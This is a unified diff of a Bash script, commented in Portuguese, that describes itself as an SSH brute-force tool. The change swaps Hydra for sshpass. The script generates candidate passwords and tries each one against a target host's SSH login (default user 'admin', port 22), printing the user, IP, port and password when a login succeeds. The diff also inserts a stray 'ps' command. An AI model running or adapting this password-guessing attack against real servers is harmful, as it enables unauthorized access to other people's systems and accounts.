@@ -3,8 +3,8 @@
 # Developed by Guizith
 
 #Este eh um script de brute force em ssh
-#Para uso eh necessario utilizar o pacote HYDRA
-#~sudo apt-get install hydra~
+#Para uso eh necessario utilizar o pacote SSHPASS
+#~sudo apt-get install sshpass~
 
 # Vetor
 VETORNUM=
@@ -14,8 +14,10 @@ R=3
 
 #Usuario de ssh
 USRR='admin'
+
 #Ip de ssh
 IPADD=
+
 #Porta de ssh
 PORTT=22
 
@@ -44,7 +46,7 @@ echo '-d             [0-9].'
 echo '-c <Universe>  Customize.'
 echo '-r <length>    Size (Default: '$R').'
 echo ' '
-echo 'Developed by Guizith.'
+echo 'Developed by Gui,will,gustavo,vitor.'
 echo ' '
 exit 1
 }
@@ -54,7 +56,7 @@ exit 1
  
 
 #Tratamento de linha de comando.
-while getopts 'u:i:p:haAdc:r' OPT
+while getopts 'u:i:p:haAdc:r:' OPT
 do
     
      case $OPT in
@@ -72,7 +74,7 @@ do
              exit 1 ;;
     esac
 done
-
+ps
 # Caso nao forneca nenhum simbolo
 [ -z "$UNIVERSO" ] && echo 'Sem simbolos a serem processados.' && exit 1
  
@@ -92,20 +94,22 @@ do
 
 
     
-    # Mostra a saida e tenta conexao com ssh
-    echo '~Tentando conexão com a senha:' $TRY
-   # esys=$(hydra -l $USRR -p $TRY $IPADD -t 4 ssh -s $PORTT)
-   esys=$(sshpass -p "$TRY" ssh $USRR@$IPADD -p $PORTT)
-   #CTRL-D
-
-   if [ "${esys}" != "" ]
+   # Mostra a saida e tenta conexao com ssh
+   echo '~Tentando conexão com a senha:' $TRY
+   #sshpass -p "$TRY" ssh $USRR@$IPADD -p $PORTT
+   #esys=$(sshpass -p "$TRY" ssh $USRR@$IPADD -p $PORTT -s "exit" )
+   #=======>CTRL-D <======
+    
+   if [ "$(sshpass -p "$TRY" ssh $USRR@$IPADD -p $PORTT) " != " " ]
     then
-	  echo '-->Conexao aceita<--'
+          echo ' '
+          echo '-->Conexao aceita<--'
 	  echo 'User:' $USRR
 	  echo 'Ip Address:' $IPADD
 	  echo 'Port:' $PORTT
 	  echo 'Password:' $TRY
-          exit
+          echo ' '
+	  exit
     fi
 
 
